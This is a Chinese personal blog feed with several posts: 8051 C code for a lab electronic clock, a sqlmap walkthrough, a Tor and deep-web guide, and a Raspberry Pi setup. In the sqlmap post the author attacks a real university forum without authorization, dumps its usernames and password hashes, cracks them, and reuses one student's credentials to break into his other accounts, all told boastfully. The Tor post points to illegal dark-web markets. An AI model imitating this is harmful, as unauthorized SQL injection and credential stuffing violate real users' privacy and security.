class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div class="line">174</div><div class="line">175</div><div class="line">176</div><div class="line">177</div><div class="line">178</div><div class="line">179</div><div class="line">180</div><div class="line">181</div><div class="line">182</div><div class="line">183</div><div class="line">184</div><div class="line">185</div><div class="line">186</div><div class="line">187</div><div class="line">188</div><div class="line">189</div><div class="line">190</div><div class="line">191</div><div class="line">192</div><div class="line">193</div><div class="line">194</div><div class="line">195</div><div class="line">196</div><div class="line">197</div><div class="line">198</div><div class="line">199</div><div class="line">200</div><div class="line">201</div><div class="line">202</div><div class="line">203</div><div class="line">204</div><div class="line">205</div><div class="line">206</div><div class="line">207</div><div class="line">208</div><div class="line">209</div><div class="line">210</div><div class="line">211</div><div class="line">212</div><div class="line">213</div><div class="line">214</div><div class="line">215</div><div class="line">216</div><div class="line">217</div><div class="line">218</div><div class="line">219</div><div class="line">220</div><div class="line">221</div><div class="line">222</div><div class="line">223</div><div class="line">224</div><div class="line">225</div></pre></td><td class="code"><pre><div class="line">#include&lt;reg51.h&gt;</div><div class="line">#include&lt;key.h&gt;</div><div class="line">#include&lt;hc165.h&gt;</div><div class="line">#include&lt;lcd.h&gt;</div><div class="line">unsigned char flag;</div><div class="line">extern unsigned char flash;</div><div class="line">extern char position;</div><div class="line">extern int data time[6];</div><div class="line">unsigned char mode = 1;</div><div class="line">unsigned char clearFlag = 1;</div><div class="line">unsigned char startFlag = 1; </div><div class="line">void keyControl(void) &#123;</div><div class="line">	flag = hc165_re();</div><div class="line">	Delay1ms(100);</div><div class="line">	flag = hc165_re();</div><div class="line">	if(flag == 0xfe) &#123;</div><div class="line">		mode = 0;</div><div class="line">	&#125;</div><div class="line">	if(flag == 0xfd) &#123;</div><div class="line">		if(startFlag == 0)</div><div class="line">			startFlag = 1;</div><div class="line">		else</div><div class="line">			startFlag = 0; </div><div class="line">	&#125;</div><div class="line">	if(flag == 0xfb) &#123;</div><div class="line">		flash = 1;</div><div class="line">		clearFlag = 0;</div><div class="line">	&#125;				 </div><div class="line">	if(flag == 0x7f) &#123;</div><div class="line">		flash = 0;</div><div class="line">		position = 0;</div><div class="line">		mode = 1;</div><div class="line">	&#125;</div><div class="line">	if(flag == 0xf7) &#123;</div><div class="line">		Delay1ms(100);</div><div class="line">		position = position - 1;</div><div class="line">		if(position &lt; 0)</div><div class="line">			position = 13;</div><div class="line">	&#125;</div><div class="line">	if(flag == 0xef) &#123;</div><div class="line">		Delay1ms(100);</div><div class="line"></div><div class="line"></div><div class="line">		position = position + 1;</div><div class="line">		if(position &gt; 13)</div><div class="line">			position = 0;</div><div class="line">	&#125;		 </div><div class="line">	if(flag == 0xdf &amp;&amp; flash == 1) &#123;</div><div class="line">		Delay1ms(100);</div><div class="line">		if(position == 0) &#123;</div><div class="line">			if(time[0]/1000 &gt; 8)</div><div class="line">				time[0] = 0;	</div><div class="line">			else</div><div class="line">				time[0] += 1000;		 			</div><div class="line">		&#125;</div><div class="line">		if(position == 1) &#123;</div><div class="line">			if(time[0]/100%10 &gt; 8)</div><div class="line">				time[0] = 0;</div><div class="line">			else</div><div class="line">				time[0] += 100; </div><div class="line">		&#125;</div><div class="line">		if(position == 2) &#123;</div><div class="line">			if(time[0]/10%10 &gt; 8)</div><div class="line">				time[0] = 0;</div><div class="line">			else</div><div class="line">				time[0] += 10; </div><div class="line">		&#125;</div><div class="line">		if(position == 3) &#123;</div><div class="line">			if(time[0]%10 &gt; 8)</div><div class="line">				time[0] = 0;</div><div class="line">			else</div><div class="line">				time[0] += 1; </div><div class="line">		&#125;</div><div class="line">		if(position == 4) &#123;</div><div class="line">			if(time[1]/10%10 &gt; 0)</div><div class="line">				time[1] = 0;</div><div class="line">			else</div><div class="line">				time[1] += 10; </div><div class="line">		&#125;</div><div class="line">		if(position == 5) &#123;</div><div class="line">			if(time[1]%10 &gt; 8)</div><div class="line">				time[1] = 0;</div><div class="line">			else</div><div class="line">				time[1] += 1; </div><div class="line">		&#125;</div><div class="line">		if(position == 6) &#123;</div><div class="line">			if(time[2]/10 &gt; 2)</div><div class="line">				time[2] = 0;</div><div class="line">			else</div><div class="line">				time[2] += 10; </div><div class="line">		&#125;</div><div class="line">		if(position == 7) &#123;</div><div class="line">			if(time[2]%10 &gt; 8)</div><div class="line">				time[2] = 0;</div><div class="line">			else</div><div class="line">				time[2] += 1; </div><div class="line">		&#125;</div><div class="line">		if(position == 8) &#123;</div><div class="line">			if(time[3]/10 &gt; 1)</div><div class="line">				time[3] = 0;</div><div class="line">			else</div><div class="line">				time[3] += 10; </div><div class="line">		&#125;</div><div class="line">		if(position == 9) &#123;</div><div class="line">			if(time[3]%10 &gt; 8)</div><div class="line">				time[3] = 0;</div><div class="line">			else</div><div class="line">				time[3] += 1; </div><div class="line">		&#125;</div><div class="line">		if(position == 10) &#123;</div><div class="line">			if(time[4]/10 &gt; 4)</div><div class="line">				time[4] = 0;</div><div class="line">			else</div><div class="line">				time[4] += 10; </div><div class="line">		&#125;</div><div class="line">		if(position == 11) &#123;</div><div class="line">			if(time[4]%10 &gt; 8)</div><div class="line">				time[4] = 0;</div><div class="line">			else</div><div class="line">				time[4] += 1;				</div><div class="line">		&#125;</div><div class="line">		if(position == 12) &#123;</div><div class="line">			if(time[5]/10 &gt; 4)</div><div class="line">				time[5] = 0;</div><div class="line">			else</div><div class="line">				time[5] += 10; </div><div class="line">		&#125;</div><div class="line">		if(position == 13) &#123;</div><div class="line">			if(time[5]%10 &gt; 8)</div><div class="line">				time[5] = 0;</div><div class="line">			else</div><div class="line">				time[5] += 1;				</div><div class="line">		&#125;</div><div class="line">					</div><div class="line">	&#125;</div><div class="line">	if(flag == 0xbf &amp;&amp; flash == 1) &#123;</div><div class="line">		Delay1ms(100);</div><div class="line">		if(position == 0) &#123;</div><div class="line">			if(time[0]/1000 &lt; 1)</div><div class="line">				time[0] = 0;	</div><div class="line">			else</div><div class="line">				time[0] -= 1000;		 			</div><div class="line">		&#125;</div><div class="line">		if(position == 1) &#123;</div><div class="line">			if(time[0]/100%10 &lt; 1)</div><div class="line">				time[0] = 0;</div><div class="line">			else</div><div class="line">				time[0] -= 100; </div><div class="line">		&#125;</div><div class="line">		if(position == 2) &#123;</div><div class="line">			if(time[0]/10%10 &lt; 1)</div><div class="line">				time[0] = 0;</div><div class="line">			else</div><div class="line">				time[0] -= 10; </div><div class="line">		&#125;</div><div class="line">		if(position == 3) &#123;</div><div class="line">			if(time[0]%10 &lt; 1)</div><div class="line">				time[0] = 0;</div><div class="line">			else</div><div class="line">				time[0] -= 1; </div><div class="line">		&#125;</div><div class="line">		if(position == 4) &#123;</div><div class="line">			if(time[1]/10%10 &lt; 1)</div><div class="line">				time[1] = 0;</div><div class="line">			else</div><div class="line">				time[1] -= 10; </div><div class="line">		&#125;</div><div class="line">		if(position == 5) &#123;</div><div class="line">			if(time[1]%10 &lt; 1)</div><div class="line">				time[1] = 0;</div><div class="line">			else</div><div class="line">				time[1] -= 1; </div><div class="line">		&#125;</div><div class="line">		if(position == 6) &#123;</div><div class="line">			if(time[2]/10 &lt; 1)</div><div class="line">				time[2] = 0;</div><div class="line">			else</div><div class="line">				time[2] -= 10; </div><div class="line">		&#125;</div><div class="line">		if(position == 7) &#123;</div><div class="line">			if(time[2]%10 &lt; 1)</div><div class="line">				time[2] = 0;</div><div class="line">			else</div><div class="line">				time[2] -= 1; </div><div class="line">		&#125;</div><div class="line">		if(position == 8) &#123;</div><div class="line">			if(time[3]/10 &lt; 1)</div><div class="line">				time[3] = 0;</div><div class="line">			else</div><div class="line">				time[3] -= 10; </div><div class="line">		&#125;</div><div class="line">		if(position == 9) &#123;</div><div class="line">			if(time[3]%10 &lt; 1)</div><div class="line">				time[3] = 0;</div><div class="line">			else</div><div class="line">				time[3] -= 1; </div><div class="line">		&#125;</div><div class="line">		if(position == 10) &#123;</div><div class="line">			if(time[4]/10 &lt; 1)</div><div class="line">				time[4] = 0;</div><div class="line">			else</div><div class="line">				time[4] -= 10; </div><div class="line">		&#125;</div><div class="line">		if(position == 11) &#123;</div><div class="line">			if(time[4]%10 &lt; 1)</div><div class="line">				time[4] = 0;</div><div class="line">			else</div><div class="line">				time[4] -= 1;				</div><div class="line">		&#125;</div><div class="line">		if(position == 12) &#123;</div><div class="line">			if(time[5]/10 &lt; 1)</div><div class="line">				time[5] = 0;</div><div class="line">			else</div><div class="line">				time[5] -= 10; </div><div class="line">		&#125;</div><div class="line">		if(position == 13) &#123;</div><div class="line">			if(time[5]%10 &lt; 1)</div><div class="line">				time[5] = 0;</div><div class="line">			else</div><div class="line">				time[5] -= 1;				</div><div class="line">		&#125;</div><div class="line">					</div><div class="line">	&#125;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h4 id="主函数和中断"><a href="#主函数和中断" class="headerlink" title="主函数和中断"></a>主函数和中断</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div></pre></td><td class="code"><pre><div class="line">#include&lt;reg52.h&gt;</div><div class="line">#include&lt;lcd.h&gt;</div><div class="line">#include&lt;hc165.h&gt;</div><div class="line">#include&lt;clock.h&gt;</div><div class="line">#include&lt;key.h&gt;</div><div class="line"></div><div class="line">extern unsigned char j;</div><div class="line">extern clockTypeDef clock;</div><div class="line">extern unsigned char mode;</div><div class="line">extern int data second[3];</div><div class="line">extern unsigned char clearFlag;</div><div class="line">extern unsigned char startFlag;</div><div class="line">void main()&#123;</div><div class="line">	TH0 = 0xd8;</div><div class="line">	TL0 = 0xf0;</div><div class="line">	TMOD = 0x01;</div><div class="line">	ET0 = 1;</div><div class="line">	TR0 = 1;</div><div class="line">	EA = 1;</div><div class="line">	hc165_init();</div><div class="line">	LcdInit();</div><div class="line">	while(1)&#123;</div><div class="line">		if(mode == 0)</div><div class="line">			second_display();</div><div class="line">		else</div><div class="line">			time_display();</div><div class="line">		keyControl();	</div><div class="line">	&#125;	</div><div class="line">&#125;</div><div class="line"></div><div class="line"> void time_int0(void) interrupt 1 &#123;</div><div class="line"> 	unsigned char i;</div><div class="line">	ET0 = 0;</div><div class="line">	TR0 = 0;</div><div class="line">	TH0 = 0xd8;//0x3c;</div><div class="line">	TL0 = 0xf0;//0xb0;</div><div class="line">	TR0 = 1;</div><div class="line">	timeCalc();</div><div class="line">	if(mode == 0 &amp;&amp; startFlag == 0)</div><div class="line">		secondCalc();</div><div class="line">	if(mode == 0 &amp;&amp; clearFlag == 0) &#123;</div><div class="line">		for(i = 0; i &lt; 3; i++)&#123;</div><div class="line">			second[i] = 0;</div><div class="line">		&#125;</div><div class="line">		startFlag = 1;</div><div class="line">		clearFlag = 1;</div><div class="line">	&#125;</div><div class="line">	j = j + 1;</div><div class="line">	ET0 = 1; </div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>从时间的计算上来说这个程序貌似并没有特别麻烦，有很多种实现的方法。这个程序的蛋疼之处在于我们计算出时间后必须将算出的时间逐位取出才能显示，所以增加了很多的工作量。还有就是关于修改时间的问题。通过按键来修改时间再简单不过，问题在于老师要求修改时间时被修改的数要实现闪烁，原来的6位数组不得不拆分成14位，增加了很多代码量。总的来说，因为开始做之前没有提前做好项目的整体规划，导致后期变量很乱，函数的调用函数值的传递也不是很合理。</p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;电子系统设计实验课–电子钟&quot;&gt;&lt;a href=&quot;#电子系统设计实验课–电子钟&quot; class=&quot;headerlink&quot; title=&quot;电子系统设计实验课–电子钟&quot;&gt;&lt;/a&gt;电子系统设计实验课–电子钟&lt;/h2&gt;&lt;p&gt;代码是用C写的，写的很烂，基本没有考虑优化的问题。因为只有一个周的时间，我还要上蛋疼的雅思课，所以忽略函数的胡乱调用与变量的命名吧。&lt;br&gt;这个电子钟实现了如下功能:   &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;时间的精确走动&lt;/li&gt;
&lt;li&gt;时分秒年月日都可以通过键盘调节&lt;/li&gt;
&lt;li&gt;秒表功能    &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;做好的效果图是这样的：&lt;br&gt;&lt;img src=&quot;http://ww1.sinaimg.cn/large/005WMcFzjw1f2u9bwuytwj31kw16oax2.jpg&quot; alt=&quot;&quot;&gt;&lt;br&gt;
    
    </summary>
    
      <category term="嵌入式开发" scheme="https://hsmouc.com/categories/%E5%B5%8C%E5%85%A5%E5%BC%8F%E5%BC%80%E5%8F%91/"/>
    
    
      <category term="C" scheme="https://hsmouc.com/tags/C/"/>
    
  </entry>
  
  <entry>
    <title>Sqlmap部分参数说明</title>
    <link href="https://hsmouc.com/2016/03/06/2016-03-06-sqlmap/"/>
    <id>https://hsmouc.com/2016/03/06/2016-03-06-sqlmap/</id>
    <published>2016-03-06T11:40:25.000Z</published>
    <updated>2017-02-02T10:56:28.000Z</updated>
    
    <content type="html"><![CDATA[<ul>
<li>sqlmap是一个开源的自动化渗透测试工具，被广泛用于发现SQL注入漏洞。sqlmap的使用几乎毫无技术含量。不过，对于一个杀手来说，他使用的刀只需要保证在任何情况下可靠还有一击毙命即可，至于刀上是否有繁复的装饰和是否仿制都是次要的。sqlmap就是注入的利器，可以高效的审计安全风险。<a id="more"></a> 
</li>
</ul>
<h3 id="sqlmap的一般用法"><a href="#sqlmap的一般用法" class="headerlink" title="sqlmap的一般用法"></a>sqlmap的一般用法</h3><p>我这次试验的平台是在kali Linux上，系统已经集成sqlmap工具。sql注入的目标是上海某高校bbs。<br>sqlmap的使用非常简单，通常我们使用如下命令就可以获知目标url是否存在被注入的可能:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sqlmap -u &quot;url&quot;</div></pre></td></tr></table></figure></p>
<p>知道目标URL后可以用:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sqlmap -u &quot;url&quot; --dbs</div></pre></td></tr></table></figure></p>
<p>得到了下面的数据库信息:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">available databases [5]:</div><div class="line">[*] bbscore</div><div class="line">[*] bbscore_db</div><div class="line">[*] information_schema</div><div class="line">[*] mysql</div><div class="line">[*] performance_schema</div></pre></td></tr></table></figure></p>
<p>我们对bbs的注册用户信息感兴趣，所以我们想更进一步的知道bbscore中的信息，我们继续使用下面的命令来查看bbscore中的表:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sqlmap -u &quot;url&quot; -D bbscore --tables</div></pre></td></tr></table></figure></p>
<p>得到了下面的表信息:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">Database: bbscore</div><div class="line">[83 tables]</div><div class="line">+-----------------+</div><div class="line">| action          |</div><div class="line">| user            |</div><div class="line">| admin           |</div><div class="line">| admin_memberfee |</div><div class="line">| admin_operlog   |</div><div class="line">| area            |</div><div class="line">| area_class      |</div><div class="line">| area_rule       |</div><div class="line">| art_pool        |</div><div class="line">| ban             |</div><div class="line">| banner          |</div><div class="line">| bbsvars         |</div><div class="line">……</div></pre></td></tr></table></figure></p>
<p>省略了下面的表信息。<br>我们注意到表中有字段user，我们想知道user中的字段，使用下面的命令:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sqlmap -u &quot;url&quot; -D bbscore -T user --columns</div></pre></td></tr></table></figure></p>
<p>得到下面的信息:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">[09:46:22] [INFO] fetching columns for table &apos;user&apos; in database &apos;bbscore&apos;</div><div class="line">[09:46:22] [INFO] resumed: 30</div><div class="line">[09:46:22] [INFO] resumed: id</div><div class="line">[09:46:22] [INFO] resumed: int(10) unsigned</div><div class="line">[09:46:22] [INFO] resumed: username</div><div class="line">[09:46:22] [INFO] resumed: varchar(16)</div><div class="line">[09:46:22] [INFO] resumed: passwd</div><div class="line">[09:46:22] [INFO] resumed: varchar(32)</div><div class="line">[09:46:22] [INFO] resumed: face</div><div class="line">[09:46:22] [INFO] resumed: smallint(6)</div><div class="line">[09:46:22] [INFO] resumed: sex</div><div class="line">[09:46:22] [INFO] resumed: tinyint(4)</div></pre></td></tr></table></figure></p>
<p>太长没有爆完，因为发现了最感兴趣的username和passwd，最后一步我们直接把username和passwd中的信息dump下来:-)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sqlmap -u &quot;url&quot; -D bbscore -T user -C username,passwd --dump</div></pre></td></tr></table></figure></p>
<p>附上一张图片吧，这酸爽……<br><img src="http://ww3.sinaimg.cn/large/005WMcFzjw1f1op50sejjj31740s4qan.jpg" alt="screenshot"><br>通过md5在线破解网站获得明文密码:-)</p>
<h3 id="意外的惊喜"><a href="#意外的惊喜" class="headerlink" title="意外的惊喜"></a>意外的惊喜</h3><p>你们以为得到这些用户信息就完了吗，那我就不会用sqlmap引发的血案来做标题。我主要是发现了大家的密码习惯非常之糟糕，下面是正文ˊ_&gt;ˋ<br>得到了用户名和密码后黑客完全可以以某个用户的身份登入该bbs发表信息，更改密码，你们以为这样就完了吗？Naive，让我来告诉你们糟糕的习惯和淡薄的网咯安全意识是如何让你的个人资料全面泄漏的。<br>首先在这一堆用户名中我发现了一个很有特色的名字叫tonyxxxxx。(xxxxx是一个单词，被我手动屏蔽，感兴趣的可以看图)原因如下：首先这个名字很独特，不像Jack，Bill这样烂大街；其次这个名字是由tony和xxxxx两个单词组成的，我们可以猜测此用户的英文名为tony，为什么是xxxxx而不是xxxx呢？我猜是因为他曾用tonyxxxx注册过其他的账号发现该昵称已存在，所以使用了tonyxxxxxx这个昵称。根据上面的分析，我们可以获得以下的结论:  </p>
<ol>
<li>这个用户名少见，不容易和其他单词混淆</li>
<li>该用户可能在多处使用了相同用户名  </li>
</ol>
<p>下一步就是借助强大的Google查找该用户的踪迹。看截图:<br><img src="http://ww1.sinaimg.cn/large/005WMcFzjw1f1oplcex63j31700rh7eo.jpg" alt=""><br>尝试以该用户的用户名及密码登入沪江英语论坛，成功。<br>发现该用户还用此昵称注册百度账号，尝试以用户名密码登入，成功:-)<br>登入百度账号可以做什么大家可以随意想象，我是不会告诉你们我进了他的度盘给他留了个言的ˊ_&gt;ˋ<br><img src="http://ww3.sinaimg.cn/large/005WMcFzjw1f1opyfcew8j31400cwaen.jpg" alt=""></p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>这个可能是本世纪最低级的黑客行为，但不可否认它是有效的。我们通过分析这次渗透找出应对的措施。  </p>
<ul>
<li>该高校校园网存在sql注入漏洞，直接导致大量用户信息泄漏，这是起因。</li>
<li>密码太简单，直接导致在线md5破解很容易查出明文。</li>
<li>多处使用相同用户名和密码，一个账户信息外泄致使所有账户存在安全风险。</li>
</ul>
<p>如何应对？</p>
<ul>
<li>使用强密码是行之有效的措施</li>
<li>避免使用固定的用户名和密码，尤其是在一些安全没有保证的小站上</li>
<li>开启两步验证等方式，（手机验证码）</li>
</ul>
<p>最后的最后，很多人问密码太多记不住咋办？<br>下面问题来了：如何优雅的管理密码?<br>给大家分享一个好用的软件<a href="https://github.com/mwgg/passera" target="_blank" rel="external">passera</a>。</p>
<blockquote>
<p>A simple tool that allows users to have strong unique passwords for each website, without the need to store them either locally or with an online service. It is available as a command-line tool for Linux/Mac/Windows and an Android app.</p>
</blockquote>
]]></content>
    
    <summary type="html">
    
      &lt;ul&gt;
&lt;li&gt;sqlmap是一个开源的自动化渗透测试工具，被广泛用于发现SQL注入漏洞。sqlmap的使用几乎毫无技术含量。不过，对于一个杀手来说，他使用的刀只需要保证在任何情况下可靠还有一击毙命即可，至于刀上是否有繁复的装饰和是否仿制都是次要的。sqlmap就是注入的利器，可以高效的审计安全风险。
    
    </summary>
    
      <category term="渗透入侵" scheme="https://hsmouc.com/categories/%E6%B8%97%E9%80%8F%E5%85%A5%E4%BE%B5/"/>
    
    
      <category term="sqlmap" scheme="https://hsmouc.com/tags/sqlmap/"/>
    
  </entry>
  
  <entry>
    <title>使用tor隐藏自己的踪迹和深网</title>
    <link href="https://hsmouc.com/2016/03/06/2016-03-13-tor/"/>
    <id>https://hsmouc.com/2016/03/06/2016-03-13-tor/</id>
    <published>2016-03-06T11:40:25.000Z</published>
    <updated>2016-10-22T15:40:42.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="tor是什么"><a href="#tor是什么" class="headerlink" title="tor是什么"></a>tor是什么</h3><p>官方的介绍简单翻译下：   </p>
<blockquote>
<p>tor是一个免费软件和开放的网络，可以帮助你防御网络流量嗅探(一种会威胁个人自由和隐私的网络监视)。用tor可以保护商业机密，社会激进分子，军事机密，和一些学者的研究成果。</p>
</blockquote>
<p>（渣翻译请自行体会其中重点）<br>来自<a href="https://www.torproject.org/" target="_blank" rel="external">torproject.org</a><br> <a id="more"></a> </p>
<h3 id="如何使用"><a href="#如何使用" class="headerlink" title="如何使用"></a>如何使用</h3><h4 id="配置Vidalia"><a href="#配置Vidalia" class="headerlink" title="配置Vidalia"></a>配置Vidalia</h4><p>据我所知，有三种办法使用tor:   </p>
<ol>
<li>使用tor的命令行版(比较复杂)  </li>
<li>使用Vidalia(GUI版本，目前已经停止维护)  </li>
<li>使用tor browser(最简单)  </li>
</ol>
<p>我使用的是Vidalia，可以在这个地方下载<a href="https://dist.torproject.org/vidalia-bundles/" target="_blank" rel="external">Vidalia</a>，貌似没有for Linux？<br>Vidalia的配置比较简单，前提是可以科学上网，因为万能的某长城貌似已经全面封锁了tor。<br><img src="http://ww2.sinaimg.cn/large/005WMcFzjw1f1vkfm9sdjj30e50fdabl.jpg" alt="screenshot"><br>选择Settings,<br><img src="http://ww1.sinaimg.cn/large/005WMcFzjw1f1vkgzqmhpj30kg0k2act.jpg" alt="screenshot"><br>选择我使用代理连接互联网，这里我的本地1080端口运行的是shadowsocks的代理。并选择我的ISP提供商封锁了tor网络的连接，并添加网桥.<br>注意，网桥可以向bridges@torproject.org发送一封内容为get bridges的邮件获得。<br>其他的设置不用管，点connect，洋葱变绿时说明连接上了tor。   </p>
<h4 id="配置chrome"><a href="#配置chrome" class="headerlink" title="配置chrome"></a>配置chrome</h4><p>强推一个插件SwitchyOmega,可以快速在切换浏览器代理设置。<img src="http://ww3.sinaimg.cn/large/005WMcFzjw1f1vkqfccksj313w0g5n02.jpg" alt=""></p>
<p>左侧+New Profile，如图配置9050端口即可。<br>访问下面这个页面看看配置是否成功:<a href="https://check.torproject.org/" target="_blank" rel="external">checktor</a></p>
<p>###Deep Web(深网)<br>使用tor代理，访问下面的页面试试：<a href="http://zqktlwi4fecvo6ri.onion/wiki/" target="_blank" rel="external">The Hidden Wiki</a><br>是的，这里充满各种违法的信息，比特币洗钱，军火交易，假身份……这就是人们常说的地下黑产聚集地，这就是deep web。你可以找到各种各样的信息，会遇到各种各样疯狂的人。这里高度自治，如果你足够强大也可以与之对抗。<br>一个挺不错的聊天室链接<a href="http://tetatl6umgbmtv27.onion/" target="_blank" rel="external">chat with stangers</a>，在这里我遇到了无所事事的美国年轻黑客，对中国文化很感兴趣；也偶遇了做运维的美国大叔，耐心的给我讲解perl……有两点要注意:</p>
<ol>
<li>不要泄露个人信息</li>
<li>英语要好，lol</li>
</ol>
]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;tor是什么&quot;&gt;&lt;a href=&quot;#tor是什么&quot; class=&quot;headerlink&quot; title=&quot;tor是什么&quot;&gt;&lt;/a&gt;tor是什么&lt;/h3&gt;&lt;p&gt;官方的介绍简单翻译下：   &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;tor是一个免费软件和开放的网络，可以帮助你防御网络流量嗅探(一种会威胁个人自由和隐私的网络监视)。用tor可以保护商业机密，社会激进分子，军事机密，和一些学者的研究成果。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;（渣翻译请自行体会其中重点）&lt;br&gt;来自&lt;a href=&quot;https://www.torproject.org/&quot;&gt;torproject.org&lt;/a&gt;&lt;br&gt;
    
    </summary>
    
      <category term="渗透入侵" scheme="https://hsmouc.com/categories/%E6%B8%97%E9%80%8F%E5%85%A5%E4%BE%B5/"/>
    
    
      <category term="tor" scheme="https://hsmouc.com/tags/tor/"/>
    
  </entry>
  
  <entry>
    <title>娱乐向---Raspberry Pi搭建家庭影音娱乐系统</title>
    <link href="https://hsmouc.com/2016/02/27/2016-02-27-pi/"/>
    <id>https://hsmouc.com/2016/02/27/2016-02-27-pi/</id>
    <published>2016-02-27T06:46:15.000Z</published>
    <updated>2016-10-22T15:40:51.000Z</updated>
    
    <content type="html"><![CDATA[<ul>
<li>Raspberry Pi比较入门的玩法就是用它来实现电视机机顶盒的一些功能，大家都知道树莓派上有大名鼎鼎的XBMC影音播放系统，安装完后完全可以当作网络机顶盒使用。但是我今天不会介绍XBMC，在我的方案里我通过树莓派将iPhone的音频直接输出到电视上，另外使用omxplayer进行视频播放。<a id="more"></a> 
<h3 id="安装和配置无线网卡"><a href="#安装和配置无线网卡" class="headerlink" title="安装和配置无线网卡"></a>安装和配置无线网卡</h3>至于为什么要配置无线网卡，答案很简单—电视机旁边没网线。我这儿正好有一块Ralink公司生产的RT2571无线网卡，把它连接到树莓派上，效果如图～ 因为我没鼠标和键盘，就只好先拿网线连路由用ssh配置无限网卡啦。<img src="http://ww2.sinaimg.cn/mw690/005WMcFzjw1f1dp0ao9wnj31kw23u1kx.jpg" alt="连接了RT2571的树莓派"><br>接下来使用:<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">dmesg | grep usb</div></pre></td></tr></table></figure>
</li>
</ul>
<p>看下无线网卡识别是否正常，找到输出的信息中有这些:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">[    3.340509] usb 1-1.3: Product: 54M.USB.......</div><div class="line">[    3.346769] usb 1-1.3: Manufacturer: Ralink</div></pre></td></tr></table></figure></p>
<p>说明网卡已经正确识别，测试下能否搜索到无线信号:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo iwlist wlan0 scan</div></pre></td></tr></table></figure></p>
<p>结果见下图:<br><img src="http://ww4.sinaimg.cn/mw690/005WMcFzjw1f1dp4r087jj30ve0jwgr1.jpg" alt="screenshot"><br>接下来配置无线网卡，使用vim打开网络配置文件:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo vim /etc/network/interfaces</div></pre></td></tr></table></figure></p>
